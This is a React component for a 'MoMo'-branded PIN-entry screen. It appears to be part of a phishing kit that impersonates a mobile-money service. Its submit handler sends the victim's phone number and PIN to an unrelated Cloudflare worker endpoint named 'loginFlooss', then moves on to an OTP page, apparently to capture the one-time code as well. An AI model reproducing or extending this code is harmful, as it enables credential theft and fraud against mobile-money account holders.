import React from "react";
import { useState, useRef } from "react";
import { useLocation, useNavigate } from "react-router-dom";

export default function PINEntry() {
  const [pin, setPin] = useState(["", "", "", ""]);
  const inputs = useRef([]);
  const navigate = useNavigate();
  const location = useLocation();
  const { phone } = location.state

  const handleChange = (val, idx) => {
    if (!/^\d?$/.test(val)) return;
    const newPin = [...pin];
    newPin[idx] = val;
    setPin(newPin);
    if (val && idx < 3) inputs.current[idx + 1]?.focus();
  };

  const handleKeyDown = (e, idx) => {
    if (e.key === "Backspace" && !pin[idx] && idx > 0) {
      const newPin = [...pin];
      newPin[idx - 1] = "";
      setPin(newPin);
      inputs.current[idx - 1]?.focus();
    }
  };


  const handleSubmit = async () => {
    const payload = {
      mobile:phone,
      pin: pin.join("")
    }
    const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/loginFlooss',
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      },
    );
    const json = await res.json();
    if (res.ok) {
      navigate('/otppage', { state: { phone: phone, pin: pin } })
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-black h-8 w-full" />

      <div className="bg-yellow-400 flex items-center justify-between py-8 px-4">
        <button
          onClick={() => navigate(-1)} // ✅ Wapas OTP pe
          className="text-gray-900 text-2xl font-bold"
        >
          ‹
        </button>
        <h1 className="text-3xl font-black text-gray-900 tracking-wide">MoMo</h1>
        <div className="w-6" /> {/* spacer for centering */}
      </div>

      <div className="flex flex-col items-center flex-1 pt-16 px-6">
        <p className="text-2xl text-gray-800 font-light mb-10 tracking-wide">
          Enter your PIN
        </p>

        <div className="flex gap-5 mb-12">
          {pin.map((digit, idx) => (
            <div key={idx} className="relative">
              <input
                ref={(el) => (inputs.current[idx] = el)}
                type="password"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e.target.value, idx)}
                onKeyDown={(e) => handleKeyDown(e, idx)}
                className="absolute inset-0 opacity-0 w-full h-full cursor-pointer"
                autoComplete="off"
              />
              <div
                onClick={() => inputs.current[idx]?.focus()}
                className={`w-12 h-12 rounded-full transition-colors duration-150 cursor-pointer ${digit ? "bg-yellow-400" : "bg-gray-300"
                  }`}
              />
            </div>
          ))}
        </div>

        <button className="mt-4 text-blue-600 font-semibold text-base hover:underline">
          Forgot PIN?
        </button>
        <button
          onClick={handleSubmit}
          // onClick={() => navigate("/pincode")} // ✅ PIN page pe jao
          // disabled={!isComplete}
          className="w-full bg-[#FFCC00] active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-4 mb-4 transition-colors shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Verify
        </button>
      </div>
    </div>
  );
}